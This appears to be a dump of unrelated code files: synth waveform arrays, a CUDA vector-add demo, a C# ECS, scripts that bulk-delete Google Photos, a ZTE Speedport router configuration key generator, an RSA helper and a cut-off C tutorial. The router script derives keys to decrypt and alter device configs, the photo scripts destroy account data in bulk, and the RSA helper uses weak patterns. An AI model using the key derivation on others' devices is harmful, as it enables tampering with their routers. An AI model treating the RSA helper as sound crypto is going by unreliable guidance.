np.array((6389,13919,26759,30739,26916,15334,974,-12788,-18496,-20486,-14241,-9895,-5074,-88,5465,12283,14213,13875,7714,-5112,-16262,-24137,-26360,-21080,-13804,-6339,-2546,1022,5717,10192,14284,12814,5884,-3584,-14853,-20729,-21777,-17355,-8987,-2139,1425,2816,5092,7750,11174,15530,14891,13592,5082,481,-5541,-9709,-7281,-3237,-968,689,-779,870,1730,8458,18862,23115,21212,14111,539,-9588,-13724,-12199,-10466,-6535,-519,6290,15466,23253,27511,21767,9304,-7425,-18461,-24309,-22074,-17772,-11248,-4530,-435,4625,7997,9899,8033,2197,-6501,-17008,-23894,-24123,-20208,-12457,-4382,429,2991,4618,7285,10759,15258,14199,7830,-3127,-13211,-20077,-17720,-12612,-5882,-12,2981,3526,6970,8399,9248,13411,14787,12886,5685,493,-6409,-8422,-3897,-665,-124,-561,-1130,202,12862,26938,30049,24117,13235,-2012,-10224,-13187,-14103,-13063,-7261,238,4127,11571,20286,21619,18395,7359,-7750,-21188,-26493,-25608,-18917,-9665,-2540,-707,3398,7582,9159,9125,3895,-5048,-14783,-21966,-23746,-21390,-13229,-5745,-597,2766,3738,3847,7309,11840,17864,14905,6798,-487,-11635,-15426,-11954,-7800,-1248,418,160,-423,1000,4037,7840,15248,22487,16214,10428,1643,-7840,-9129,-8223,-6292,-3923,-2890,), dtype=np.int16), 
np.array((28,1160,3250,4866,6598,8534,10912,12172,14490,16264,18207,20287,21911,23851,25065,27189,28229,30247,31299,32429,32681,32211,32085,31365,30597,29109,28203,25629,23851,20975,18581,15624,13026,9834,7262,4720,2144,30,-2494,-4578,-6412,-8264,-9384,-10454,-11500,-12622,-13638,-14552,-14822,-15384,-15928,-16034,-16755,-16879,-17459,-17297,-17451,-17217,-16959,-16345,-15528,-14364,-13548,-12248,-11044,-9888,-8198,-6764,-5038,-3562,-2588,-1288,-300,710,1542,2432,3070,3508,3666,4052,4072,4128,4110,3908,3942,3660,3312,2832,2326,1608,848,372,-330,-882,-1554,-2146,-2950,-3826,-4474,-5272,-5934,-6512,-7088,-7558,-8026,-8318,-8268,-8558,-8318,-7922,-7850,-7348,-7196,-6838,-6636,-6388,-6134,-5900,-5972,-6168,-6426,-7020,-7454,-8068,-8598,-9202,-9258,-9606,-9904,-9912,-9882,-9946,-9796,-9444,-8698,-7998,-7318,-5992,-4946,-3488,-1828,-214,1428,3060,4268,5526,6584,7708,8152,8642,9062,9324,9422,9324,9472,9266,9030,8782,8616,7958,7428,6486,5662,4604,3378,2392,968,90,-1240,-2216,-2978,-3696,-4028,-4804,-4828,-5290,-5456,-6182,-6378,-6712,-6956,-7394,-7262,-7514,-7640,-8318,-8296,-8952,-9114,-9540,-9228,-9190,-9130,-8382,-8078,-6970,-6270,-4584,-3332,-1568,), dtype=np.int16), 
np.array((646,3596,4474,4674,4622,6868,9722,12534,14222,13924,13958,14688,16807,17221,17049,16120,15314,15526,15636,15692,15190,14638,14804,14894,15096,14014,11848,10078,9096,8954,8710,8034,6392,4100,3096,2060,334,2564,3504,2946,3190,3974,5218,6670,8370,9756,9388,9432,10726,12590,13026,12838,14184,16100,18375,21765,24229,25393,26145,27521,29809,30907,31823,32265,31777,31693,32463,32767,32007,30393,29659,29043,27185,25729,23721,21597,20163,19923,18419,15588,13470,12180,10226,9100,9306,7670,4524,1516,1238,-36,-2126,-4742,-5390,-5972,-6814,-7262,-6692,-6950,-8528,-9696,-9862,-7514,-5704,-5042,-5116,-6062,-7482,-8448,-8290,-6550,-6310,-7984,-10582,-11578,-10888,-10828,-11474,-12356,-13158,-12928,-11648,-9514,-8650,-8904,-9582,-8758,-6652,-3906,-3216,-5102,-7570,-4600,-5578,-4378,-4026,-4810,-5760,-5764,-5118,-6296,-9644,-8144,-8586,-7638,-5924,-5142,-5282,-5560,-5714,-5014,-3460,-2624,-2926,-2264,-2468,-1640,-1398,22,572,-868,-814,-72,-372,-1250,-1096,-156,-484,-2460,-2306,-1680,-3624,-6416,-6450,-6772,-6828,-7324,-6726,-6652,-7064,-7222,-6690,-5800,-3368,-2452,-4312,-5782,-5924,-5694,-5678,-4392,-2160,-2500,-4376,-4776,-2692,-2258,-3290,-3344,-3204,-1730,), dtype=np.int16), 
np.array((290,8048,15289,21464,26163,29143,30453,30191,28627,26095,22942,19490,16007,12705,9721,7136,4980,3276,1980,1076,494,170,32,0,-2,-58,-244,-636,-1306,-2324,-3722,-5584,-7916,-10725,-13965,-17544,-21300,-25011,-28367,-31007,-32543,-32599,-30885,-27309,-21686,-14519,-6336,2230,10493,17808,23666,27755,29975,30431,29375,27189,24196,20780,17250,13845,10731,8012,5732,3898,2488,1458,758,328,104,16,0,-6,-68,-244,-590,-1154,-1984,-3106,-4550,-6316,-8389,-10691,-13193,-15741,-18156,-20216,-21676,-22296,-21858,-20232,-17388,-13443,-8651,-3446,1860,6760,10857,13873,15681,16305,15905,14735,13105,11317,9631,8231,7232,6628,6380,6390,6540,6716,6822,6794,6602,6250,5744,5118,4402,3624,2780,1890,954,-34,-1088,-2208,-3396,-4648,-5948,-7252,-8511,-9635,-10567,-11197,-11443,-11249,-10599,-9547,-8199,-6718,-5310,-4176,-3480,-3320,-3684,-4476,-5490,-6464,-7100,-7126,-6346,-4680,-2168,996,5298,9505,13259,16225,18286,19330,19398,18618,17178,15281,13135,10913,8755,6764,5008,3526,2346,1438,804,412,156,36,0,0,-26,-138,-390,-844,-1548,-2570,-3948,-5716,-7890,-10457,-13361,-16494,-19688,-22710,-25259,-26995,-27583,-26737,-24242,-20052,-14315,-7364,), dtype=np.int16), 
np.array((64,1194,2408,3746,5142,6506,7706,8656,9326,9804,10276,11002,11966,13444,15744,18777,22285,25865,29041,31357,32491,32189,30363,27077,22495,16863,10476,3678,-3164,-9648,-15352,-19823,-22799,-23959,-23215,-20669,-16625,-11600,-6204,-1084,3100,6318,7860,7702,6020,3034,-898,-5410,-10164,-14836,-19147,-22841,-25669,-27447,-28027,-27373,-25553,-22831,-19465,-15868,-12428,-9454,-7104,-5384,-4114,-3032,-1798,-174,1934,4504,7446,10490,13334,15702,17409,18337,18503,17953,16801,15138,13086,10748,8304,5878,3760,2236,1618,2132,3904,6890,10836,15338,19857,23827,26735,28167,27947,25993,22429,17493,11518,4862,-2096,-8976,-15394,-20995,-25423,-28373,-29725,-29393,-27487,-24315,-20321,-16044,-12020,-8712,-6450,-5366,-5372,-6154,-7510,-9180,-10894,-12474,-13788,-14778,-15386,-15554,-15212,-14292,-12770,-10682,-8138,-5398,-2642,-154,1872,3386,4476,5364,6360,7792,9908,12804,16405,20411,24539,28101,30595,31913,31865,30409,27623,23693,18847,13378,7606,1876,-3368,-7862,-11140,-12870,-12814,-10922,-7336,-2416,3296,9132,14410,18499,20919,21405,19867,16184,11090,5000,-1642,-8412,-14918,-20803,-25753,-29517,-31893,-32767,-32179,-30267,-27327,-23759,-20033,-16577,-13726,-11656,-10358,-9646,-9224,-8758,-7972,-6666,-4806,-2472,), dtype=np.int16), 
np.array((86,1616,3800,5882,7946,9974,11960,13892,15766,17575,19307,20959,22519,23973,25341,26607,27763,28803,29731,30535,31221,31781,32215,32527,32709,32767,32703,32515,32207,31777,31235,30577,29809,28933,27957,26883,25715,24459,23137,21721,20231,18671,17055,15376,13652,11880,10074,8232,6366,4478,2578,690,-1218,-3124,-5020,-6900,-8754,-10580,-12372,-14122,-15826,-17477,-19065,-20573,-22025,-23403,-24701,-25907,-27023,-28039,-28955,-29765,-30463,-31047,-31511,-31857,-32077,-32173,-32143,-31987,-31701,-31285,-30741,-30071,-29267,-28337,-27283,-26107,-24815,-23433,-21927,-20323,-18627,-16845,-14986,-13060,-11070,-9032,-6954,-4842,-2706,-586,1562,3704,5830,7924,9986,12000,13958,15852,17675,19413,21065,22619,24057,25403,26635,27753,28745,29611,30349,30955,31431,31773,31981,32055,31997,31811,31495,31053,30485,29797,28993,28075,27051,25921,24697,23377,21971,20503,18939,17307,15614,13864,12066,10222,8342,6432,4502,2554,598,-1360,-3290,-5234,-7160,-9058,-10928,-12756,-14544,-16276,-17951,-19563,-21101,-22565,-23943,-25223,-26419,-27521,-28517,-29405,-30179,-30839,-31377,-31793,-32081,-32241,-32273,-32173,-31943,-31579,-31083,-30459,-29703,-28825,-27821,-26697,-25457,-24105,-22647,-21091,-19461,-17725,-15906,-14016,-12066,-10058,-8004,-5910,-3794,-1600,), dtype=np.int16), 
np.array((1894,9038,15592,20853,24355,25925,25687,23967,21209,17909,14394,11012,7986,5440,3426,1926,912,334,68,2,-4,-76,-346,-940,-1974,-3546,-5738,-8598,-12108,-16172,-20581,-24987,-28899,-31709,-32767,-31553,-27691,-21183,-12462,-2344,7588,16250,22813,26827,28279,27509,25073,21649,17743,13858,10312,7292,4864,3028,1716,856,352,98,10,0,-10,-88,-288,-646,-1186,-1912,-2818,-3864,-4992,-6110,-7104,-7838,-8174,-8022,-7322,-6108,-4510,-2740,-1048,334,1242,1612,1496,1014,348,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,-26,-552,-730,-454,-4,-52,-190,-476,-978,-1742,-2862,-4372,-6296,-8598,-11182,-13838,-16256,-18033,-18719,-17897,-15296,-10890,-5022,), dtype=np.int16), 
np.array((162,858,1618,2403,3190,3970,4728,5456,6145,6797,7397,7936,8346,-10237,-10126,-11047,-11988,-12912,-13786,-14579,-15255,-15772,-16074,-16104,-15774,-14994,-13646,-11643,-8857,-5313,-1132,3422,8025,12377,16304,19720,22634,25070,27100,28754,30129,31235,32103,32600,32272,31746,31029,30123,28936,27009,-29395,-31049,-31774,-32339,-32665,-32767,-32639,-32250,-31561,-30503,-28982,-26894,-24116,-20533,-16078,-10650,-4659,1377,7021,11912,15863,18842,20942,22295,23043,23315,23210,22823,22204,21413,20496,19496,18449,17384,16343,15457,-16417,-14798,-14216,-13636,-13027,-12340,-11589,-10761,-9863,-8885,-7833,-6719,-5541,-4339,-3133,-1990,-975,-180,347,562,482,136,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,-123,-551,-756,-678,-286,0,0,), dtype=np.int16), 
)
waveforms_names = (
'AKWF_granular_0001','AKWF_granular_0002','AKWF_granular_0003','AKWF_granular_0004','AKWF_granular_0005','AKWF_granular_0006','AKWF_granular_0007','AKWF_granular_0008','AKWF_granular_0009','AKWF_granular_0010','AKWF_granular_0011','AKWF_granular_0012','AKWF_granular_0013','AKWF_granular_0014','AKWF_granular_0015','AKWF_granular_0016','AKWF_granular_0017','AKWF_granular_0018','AKWF_granular_0019','AKWF_granular_0020','AKWF_granular_0021','AKWF_granular_0022','AKWF_granular_0023','AKWF_granular_0024','AKWF_granular_0025','AKWF_granular_0026','AKWF_granular_0027','AKWF_granular_0028','AKWF_granular_0029','AKWF_granular_0030','AKWF_granular_0031','AKWF_granular_0032','AKWF_granular_0033','AKWF_granular_0034','AKWF_granular_0035','AKWF_granular_0036','AKWF_granular_0037','AKWF_granular_0038','AKWF_granular_0039','AKWF_granular_0040','AKWF_granular_0041','AKWF_granular_0042','AKWF_granular_0043','AKWF_granular_0044',
)
# end
"
"drivertest.cpp
","/*
 * drivertest.cpp
 * Vector addition (host code)
 *
 * Andrei de A. Formiga, 2012-06-04
 */


#include <stdio.h>
#include <stdlib.h>


#include <cuda.h>
#include <builtin_types.h>


#include ""matSumKernel.h""


// This will output the proper CUDA error strings
// in the event that a CUDA host call returns an error
#define checkCudaErrors(err)  __checkCudaErrors (err, __FILE__, __LINE__)


inline void __checkCudaErrors( CUresult err, const char *file, const int line )
{
 if( CUDA_SUCCESS != err) {
 fprintf(stderr,
 ""CUDA Driver API error = %04d from file <%s>, line %i.\n"",
                err, file, line );
 exit(-1);
    }
}


// --- global variables ----------------------------------------------------
CUdevice   device;
CUcontext  context;
CUmodule   module;
CUfunction function;
size_t     totalGlobalMem;


char       *module_file = (char*) ""matSumKernel.ptx"";
char       *kernel_name = (char*) ""matSum"";




// --- functions -----------------------------------------------------------
void initCUDA()
{
 int deviceCount = 0;
    CUresult err = cuInit(0);
 int major = 0, minor = 0;


 if (err == CUDA_SUCCESS)
 checkCudaErrors(cuDeviceGetCount(&deviceCount));


 if (deviceCount == 0) {
 fprintf(stderr, ""Error: no devices supporting CUDA\n"");
 exit(-1);
    }


 // get first CUDA device
 checkCudaErrors(cuDeviceGet(&device, 0));
 char name[100];
 cuDeviceGetName(name, 100, device);
 printf(""> Using device 0: %s\n"", name);


 // get compute capabilities and the devicename
 checkCudaErrors( cuDeviceComputeCapability(&major, &minor, device) );
 printf(""> GPU Device has SM %d.%d compute capability\n"", major, minor);


 checkCudaErrors( cuDeviceTotalMem(&totalGlobalMem, device) );
 printf(""  Total amount of global memory:   %llu bytes\n"",
           (unsigned long long)totalGlobalMem);
 printf(""  64-bit Memory Address:           %s\n"",
           (totalGlobalMem > (unsigned long long)4*1024*1024*1024L)?
 ""YES"" : ""NO"");


    err = cuCtxCreate(&context, 0, device);
 if (err != CUDA_SUCCESS) {
 fprintf(stderr, ""* Error initializing the CUDA context.\n"");
 cuCtxDetach(context);
 exit(-1);
    }


    err = cuModuleLoad(&module, module_file);
 if (err != CUDA_SUCCESS) {
 fprintf(stderr, ""* Error loading the module %s\n"", module_file);
 cuCtxDetach(context);
 exit(-1);
    }


    err = cuModuleGetFunction(&function, module, kernel_name);


 if (err != CUDA_SUCCESS) {
 fprintf(stderr, ""* Error getting kernel function %s\n"", kernel_name);
 cuCtxDetach(context);
 exit(-1);
    }
}


void finalizeCUDA()
{
 cuCtxDetach(context);
}


void setupDeviceMemory(CUdeviceptr *d_a, CUdeviceptr *d_b, CUdeviceptr *d_c)
{
 checkCudaErrors( cuMemAlloc(d_a, sizeof(int) * N) );
 checkCudaErrors( cuMemAlloc(d_b, sizeof(int) * N) );
 checkCudaErrors( cuMemAlloc(d_c, sizeof(int) * N) );
}


void releaseDeviceMemory(CUdeviceptr d_a, CUdeviceptr d_b, CUdeviceptr d_c)
{
 checkCudaErrors( cuMemFree(d_a) );
 checkCudaErrors( cuMemFree(d_b) );
 checkCudaErrors( cuMemFree(d_c) );
}


void runKernel(CUdeviceptr d_a, CUdeviceptr d_b, CUdeviceptr d_c)
{
 void *args[3] = { &d_a, &d_b, &d_c };


 // grid for kernel: <<<N, 1>>>
 checkCudaErrors( cuLaunchKernel(function, N, 1, 1,  // Nx1x1 blocks
 1, 1, 1,            // 1x1x1 threads
 0, 0, args, 0) );
}


int main(int argc, char **argv)
{
 int a[N], b[N], c[N];
    CUdeviceptr d_a, d_b, d_c;


 // initialize host arrays
 for (int i = 0; i < N; ++i) {
        a[i] = N - i;
        b[i] = i * i;
    }


 // initialize
 printf(""- Initializing...\n"");
 initCUDA();


 // allocate memory
 setupDeviceMemory(&d_a, &d_b, &d_c);


 // copy arrays to device
 checkCudaErrors( cuMemcpyHtoD(d_a, a, sizeof(int) * N) );
 checkCudaErrors( cuMemcpyHtoD(d_b, b, sizeof(int) * N) );


 // run
 printf(""# Running the kernel...\n"");
 runKernel(d_a, d_b, d_c);
 printf(""# Kernel complete.\n"");


 // copy results to host and report
 checkCudaErrors( cuMemcpyDtoH(c, d_c, sizeof(int) * N) );
 for (int i = 0; i < N; ++i) {
 if (c[i] != a[i] + b[i])
 printf(""* Error at array position %d: Expected %d, Got %d\n"",
                   i, a[i]+b[i], c[i]);
    }
 printf(""*** All checks complete.\n"");




 // finish
 printf(""- Finalizing...\n"");
 releaseDeviceMemory(d_a, d_b, d_c);
 finalizeCUDA();
 return 0;
}
// Vector addition (device code)


#include ""matSumKernel.h""


extern ""C"" __global__ void matSum(int *a, int *b, int *c)
{
 int tid = blockIdx.x;
 if (tid < N)
        c[tid] = a[tid] + b[tid];
}
#ifndef __MATSUMKERNEL_H


#define __MATSUMKERNEL_H




// size of the vectors to sum
#define N                 100




#endif __MATSUMKERNEL_H
==<SEPERATOR>==
Program.cs
using System;


namespace SimpleECS
{
 struct Position
 {
 public float X, Y;
 }


 struct Velocity
 {
 public float X, Y;
 }


 struct Fart
 {
 public int Power;
 }


 class Program
 {
 static void Main(string[] args)
 {
 var registry = new Registry(100);


 for (var i = 0; i < 20; i++)
 {
 var entity = registry.Create();
                registry.AddComponent<Position>(entity, new Position { X = i * 10, Y = i * 10 });
                registry.AddComponent<Velocity>(entity, new Velocity { X = 2, Y = 2 });


 if (i % 5 == 0) registry.AddComponent<Fart>(entity, new Fart { Power = 666 });
 }


            RunPrinterSystem(registry);
            RunVelocitySystem(registry);


            RunPrinterSystem(registry);
            RunVelocitySystem(registry);
 }


 static void RunVelocitySystem(Registry registry)
 {
 var view = registry.View<Velocity, Position>();
 foreach (var entity in view)
 {
 ref Position pos = ref registry.GetComponent<Position>(entity);
 ref Velocity vel = ref registry.GetComponent<Velocity>(entity);
                pos.X += vel.X;
                pos.Y += vel.Y;
 }
 }


 static void RunPrinterSystem(Registry registry)
 {
            Console.WriteLine(""----- Printer -----"");
 var view = registry.View<Velocity, Position, Fart>();
 foreach (var entity in view)
 {
 var pos = registry.GetComponent<Position>(entity);
                Console.WriteLine($""entity: {entity}, pos: {pos.X},{pos.Y}"");
 }
 }
 }
}
using System;
using System.Collections;
using System.Collections.Generic;
using Entity = System.Int32;


public class Registry
{
 readonly int maxEntities;
 Dictionary<Type, IComponentStore> data = new Dictionary<Type, IComponentStore>();
 Entity nextEntity = 0;


 public Registry(int maxEntities) => this.maxEntities = maxEntities;


 public ComponentStore<T> Assure<T>()
 {
 var type = typeof(T);
 if (data.TryGetValue(type, out var store)) return (ComponentStore<T>)data[type];


 var newStore = new ComponentStore<T>(maxEntities);
        data[type] = newStore;
 return newStore;
 }


 public Entity Create() => nextEntity++;


 public void Destroy(Entity entity)
 {
 foreach (var store in data.Values)
            store.RemoveIfContains(entity);
 }


 public void AddComponent<T>(Entity entity, T component) => Assure<T>().Add(entity, component);


 public ref T GetComponent<T>(Entity entity) => ref Assure<T>().Get(entity);


 public bool TryGetComponent<T>(Entity entity, ref T component)
 {
 var store = Assure<T>();
 if (store.Contains(entity))
 {
 component = store.Get(entity);
 return true;
 }


 return false;
 }


 public void RemoveComponent<T>(Entity entity) => Assure<T>().RemoveIfContains(entity);


 public View<T> View<T>() => new View<T>(this);


 public View<T, U> View<T, U>() => new View<T, U>(this);


 public View<T, U, V> View<T, U, V>() => new View<T, U, V>(this);
}




public struct View<T> : IEnumerable<Entity>
{
 Registry registry;


 public View(Registry registry) => this.registry = registry;


 public IEnumerator<Entity> GetEnumerator() => registry.Assure<T>().Set.GetEnumerator();


    IEnumerator IEnumerable.GetEnumerator() => GetEnumerator();
}


public struct View<T, U> : IEnumerable<Entity>
{
 Registry registry;


 public View(Registry registry) => this.registry = registry;


 public IEnumerator<Entity> GetEnumerator()
 {
 var store2 = registry.Assure<U>();
 foreach (var entity in registry.Assure<T>().Set)
 {
 if (!store2.Contains(entity)) continue;
 yield return entity;
 }
 }


    IEnumerator IEnumerable.GetEnumerator() => GetEnumerator();
}


public struct View<T, U, V> : IEnumerable<Entity>
{
 Registry registry;


 public View(Registry registry) => this.registry = registry;


 public IEnumerator<Entity> GetEnumerator()
 {
 var store2 = registry.Assure<U>();
 var store3 = registry.Assure<V>();
 foreach (var entity in registry.Assure<T>().Set)
 {
 if (!store2.Contains(entity) || !store3.Contains(entity)) continue;
 yield return entity;
 }
 }


    IEnumerator IEnumerable.GetEnumerator() => GetEnumerator();
}




public class SparseSet : IEnumerable<int>
{
 readonly int max;
 int size;
 int[] dense;
 int[] sparse;


 public int Count => size;


 public SparseSet(int maxValue)
 {
 max = maxValue + 1;
 size = 0;
 dense = new int[max];
 sparse = new int[max];
 }


 public void Add(int value)
 {
 if (value >= 0 && value < max && !Contains(value))
 {
            dense[size] = value;
            sparse[value] = size;
 size++;
 }
 }


 public void Remove(int value)
 {
 if (Contains(value))
 {
            dense[sparse[value]] = dense[size - 1];
            sparse[dense[size - 1]] = sparse[value];
 size--;
 }
 }


 public int Index(int value) => sparse[value];


 public bool Contains(int value)
 {
 if (value >= max || value < 0)
 return false;
 else
 return sparse[value] < size && dense[sparse[value]] == value;
 }


 public void Clear() => size = 0;


 public IEnumerator<int> GetEnumerator()
 {
 var i = 0;
 while (i < size)
 {
 yield return dense[i];
 i++;
 }
 }


    IEnumerator IEnumerable.GetEnumerator() => GetEnumerator();


 public override bool Equals(object obj) => throw new Exception(""Why are you comparing SparseSets?"");


 public override int GetHashCode() => System.HashCode.Combine(max, size, dense, sparse, Count);
}






public interface IComponentStore
{
 void RemoveIfContains(int entityId);
}


public class ComponentStore<T> : IComponentStore
{
 public SparseSet Set;
    T[] instances;


 public int Count => Set.Count;


 public ComponentStore(int maxComponents)
 {
 Set = new SparseSet(maxComponents);
 instances = new T[maxComponents];
 }


 public void Add(int entityId, T value)
 {
        Set.Add(entityId);
        instances[Set.Index(entityId)] = value;
 }


 public ref T Get(int entityId) => ref instances[Set.Index(entityId)];


 public bool Contains(int entityId) => Set.Contains(entityId);


 public void RemoveIfContains(int entityId)
 {
 if (Contains(entityId)) Remove(entityId);
 }


 void Remove(int entityId) => Set.Remove(entityId);
}
"
"paste_to_devtools_console.js
","for(i = 1; i<=9999; i++) {
 console.log(""Iteration # --> "" + i);
 document.querySelectorAll('div[role=checkbox]').forEach(div=>div.click());
 document.querySelectorAll('div[aria-label*=""Select all photos""]').forEach(div=>div.click());
 await new Promise(r => setTimeout(r, 3000));
try{console.log(""Selected documents count for iteration ["" + i + ""]: "" + document.evaluate('/html/body/div[1]/div/c-wiz/c-wiz[2]/span/div[1]/div/span', document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue.innerText);}catch(ex){/*do nothing*/}
 document.querySelector('button[title=Delete]').click();
 await new Promise(r => setTimeout(r, 5000));
 document.evaluate('//span[text()=""Move to trash""]', document, null, XPathResult.ANY_TYPE, null ).iterateNext().click();


 //wait for new images to load
 await new Promise(r => setTimeout(r, 15000));
}
==<SEPERATOR>==
delete-google-photos.py
""""""
1. create a separate Firefox profile
2. start that profile and log into the Google Account of choice
3. get the profile's path from `about:profiles`
4. set `profile_url` to the profile's path
5. run script
""""""
from time import sleep


from selenium import webdriver
from selenium.common.exceptions import TimeoutException, WebDriverException
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait


profile_url = ""/home/user/.mozilla/firefox/vhdacxyj.scraper""
photos_url = ""https://photos.google.com""
wait_timeout = 10


checkbox_selector = ""div.ckGgle""
delete_button_selector = 'button[title=""Delete""]'
confirmation_button_selector = "".XfpsVe > button:nth-child(2)""


options = webdriver.FirefoxOptions()
options.headless = False
fp = webdriver.FirefoxProfile(profile_url)
wd = webdriver.Firefox(firefox_profile=fp, options=options)
wd.maximize_window()
wd.get(photos_url)




def waitfor_and_find_elements(wd, selector, wait_timeout):
 return WebDriverWait(wd, wait_timeout).until(
 EC.presence_of_all_elements_located((By.CSS_SELECTOR, selector))
    )




def waitfor_and_find_element(wd, selector, wait_timeout):
 WebDriverWait(wd, wait_timeout).until(
 EC.presence_of_element_located((By.CSS_SELECTOR, selector))
    )




def select_items():
 while True:
 try:
 waitfor_and_find_elements(wd, checkbox_selector, wait_timeout)
 except TimeoutException:
 wd.get(photos_url)
 sleep(5)
 continue
 break


 checkboxes = wd.find_elements_by_css_selector(checkbox_selector)
 for cb in checkboxes:
 try:
 cb.click()
 except WebDriverException:
 continue




def reload():
 """"""
    need to reload because dom changes
    sleep to let the browser do its things
    """"""
 sleep(3)
 wd.get(photos_url)
 sleep(5)




try:
 while True:
 select_items()


 waitfor_and_find_element(wd, delete_button_selector, wait_timeout)
 delete_button = wd.find_element_by_css_selector(delete_button_selector)
 delete_button.click()


 waitfor_and_find_element(wd, confirmation_button_selector, wait_timeout)
 confirmation_button = wd.find_element_by_css_selector(
 confirmation_button_selector
        )
 confirmation_button.click()


 reload()
finally:
 wd.quit()
==<SEPERATOR>==
zte-speedport-entry-2i-key-generator.py
#!/usr/bin/env python
#
# ZTE Speedport Entry 2i Key Generator
#
# The script generates the key for decryption and encryption
# of ZTE Speedport Entry 2i configuration file using
# https://github.com/mkst/zte-config-utility
#
# Usage:
#
# ./zte-speedport-entry-2i-key-generator.py
# MAC address: c85a9fa21821
# Serial: 268EG8JL4M16271
# Factory SSID: ZTE-ABCDEF
# Factory WLAN Key: zxcvbnmasdfg
# Factory Username: admin
# Factory Password: qwertyui
# Hardware Version: V1.0.1
# ade8b5e3e9c57a5f
#
# Configuration decryption:
#
# PYTHONPATH=./zte-config-utility
# python ./zte-config-utility/examples/decode.py config.bin config.xml --key ade8b5e3e9c57a5f
#
# Configuration encryption:
#
# PYTHONPATH=./zte-config-utility
# python ./zte-config-utility/examples/encode.py config.xml config.bin --key ade8b5e3e9c57a5f --signature ""Speedport Entry 2i""


from hashlib import md5


l = lambda s: len(s).to_bytes(3, ""little"")
a = lambda s: s.encode(""ascii"")


mac = int(input(""MAC address: ""), 16)
serial = a(input(""Serial: ""))
ssid = a(input(""Factory SSID: ""))
wlan_key = a(input(""Factory WLAN Key: ""))
username = a(input(""Factory Username: ""))
password = a(input(""Factory Password: ""))
mac_zte = a(""54BE53"")
version = a(input(""Hardware Version: ""))
zero = a(""0"")


print(md5(
 b""\x01\x00\x00\x06\x00\x00"" + (mac).to_bytes(6, ""big"") + \
 b""\x01\x01\x00\x06\x00\x00"" + (mac + 1).to_bytes(6, ""big"") + \
 b""\x01\x02\x00\x06\x00\x00"" + (mac + 2).to_bytes(6, ""big"") + \
 b""\x01\x03\x00\x06\x00\x00"" + (mac + 3).to_bytes(6, ""big"") + \
 b""\x02\x00\x00"" + l(serial)   + serial + \
 b""\x04\x00\x00"" + l(ssid)     + ssid + \
 b""\x05\x10\x00"" + l(wlan_key) + wlan_key + \
 b""\x06\x01\x00"" + l(username) + username + \
 b""\x07\x01\x00"" + l(password) + password + \
 b""\x03\x00\x00"" + l(mac_zte)  + mac_zte + \
 b""\x08\x06\x00"" + l(version)  + version + \
 b""\x08\x07\x00"" + l(zero)     + zero
).hexdigest()[:16])
"
"rsa.py
","# RSA helper class for pycrypto
# Copyright (c) Dennis Lee
# Date 21 Mar 2017


# Description:
# Python helper class to perform RSA encryption, decryption, 
# signing, verifying signatures & keys generation


# Dependencies Packages:
# pycrypto 


# Documentation:
# https://www.dlitz.net/software/pycrypto/api/2.6/


# Sample usage:
'''
import rsa
from base64 import b64encode, b64decode

msg1 = ""Hello Tony, I am Jarvis!""
msg2 = ""Hello Toni, I am Jarvis!""
keysize = 2048
(public, private) = rsa.newkeys(keysize)
encrypted = b64encode(rsa.encrypt(msg1, private))
decrypted = rsa.decrypt(b64decode(encrypted), private)
signature = b64encode(rsa.sign(msg1, private, ""SHA-512""))
verify = rsa.verify(msg1, b64decode(signature), public)

print(private.exportKey('PEM'))
print(public.exportKey('PEM'))
print(""Encrypted: "" + encrypted)
print(""Decrypted: '%s'"" % decrypted)
print(""Signature: "" + signature)
print(""Verify: %s"" % verify)
rsa.verify(msg2, b64decode(signature), public)
'''


from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Signature import PKCS1_v1_5
from Crypto.Hash import SHA512, SHA384, SHA256, SHA, MD5
from Crypto import Random
from base64 import b64encode, b64decode


hash = ""SHA-256""


def newkeys(keysize):
 random_generator = Random.new().read
 key = RSA.generate(keysize, random_generator)
 private, public = key, key.publickey()
 return public, private


def importKey(externKey):
 return RSA.importKey(externKey)


def getpublickey(priv_key):
 return priv_key.publickey()


def encrypt(message, pub_key):
 #RSA encryption protocol according to PKCS#1 OAEP
 cipher = PKCS1_OAEP.new(pub_key)
 return cipher.encrypt(message)


def decrypt(ciphertext, priv_key):
 #RSA encryption protocol according to PKCS#1 OAEP
 cipher = PKCS1_OAEP.new(priv_key)
 return cipher.decrypt(ciphertext)


def sign(message, priv_key, hashAlg=""SHA-256""):
 global hash
 hash = hashAlg
 signer = PKCS1_v1_5.new(priv_key)
 if (hash == ""SHA-512""):
 digest = SHA512.new()
 elif (hash == ""SHA-384""):
 digest = SHA384.new()
 elif (hash == ""SHA-256""):
 digest = SHA256.new()
 elif (hash == ""SHA-1""):
 digest = SHA.new()
 else:
 digest = MD5.new()
 digest.update(message)
 return signer.sign(digest)


def verify(message, signature, pub_key):
 signer = PKCS1_v1_5.new(pub_key)
 if (hash == ""SHA-512""):
 digest = SHA512.new()
 elif (hash == ""SHA-384""):
 digest = SHA384.new()
 elif (hash == ""SHA-256""):
 digest = SHA256.new()
 elif (hash == ""SHA-1""):
 digest = SHA.new()
 else:
 digest = MD5.new()
 digest.update(message)
 return signer.verify(digest, signature)
==<SEPERATOR>==
functions.c
/**
 * This are a collection of examples for C 201.
 * These combine concepts you may or may not be
 * familiar with and are especially useful for
 * students new to C. There is a lot of really
 * cool stuff you can do in C without any cool
 * languages.
 * 
 * This is file in particular is an introduction
 * to fun function usage in C.
 */


#include <stdio.h>


int sum(int a, int b) {
 return a + b;
}


int sub(int a, int b) {
 return a - b;
}


// This function ""get_operator"" takes a *char expression
// and returns a function that takes two ints and returns
// an int.
int (*get_operator(char* expression)) (int, int) {
 int i;
 // char pointers are automatically given a final character '\0'
